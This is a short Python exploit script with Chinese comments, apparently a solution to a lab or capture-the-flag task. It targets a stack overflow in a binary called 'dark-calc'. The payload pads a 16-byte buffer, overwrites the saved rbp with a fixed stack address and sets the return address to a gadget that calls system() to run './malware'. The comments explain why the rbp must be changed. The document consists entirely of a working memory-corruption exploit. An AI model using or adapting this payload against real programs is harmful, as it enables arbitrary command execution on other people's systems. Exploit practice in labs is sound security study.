#!/usr/bin/env python3
# 任务1：dark-calc 的 input 有栈溢出，覆盖返回地址去执行 ./malware
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


BUF = 0x721000800fd0          # input 里 expression 的地址，这个栈是固定的

p = b"./malware\x00"          # strcpy 只会把 "./malware" 拷进 command_buf
p += b"A" * (16 - len(p))     # 填满 16 字节的 expression
p += p64(BUF)                 # saved rbp，必须改，原因见最后
p += p64(0x401a6b)            # mov edi, 0x6030d0 ; call system@plt

# saved rbp 要改成 BUF：跳过去以后 system 返回还要走 fflush 和 leave;ret，
# 如果 rbp 还是原来的值，ret 会再弹回 0x401a6b，变成死循环。
sys.stdout.buffer.write(p)
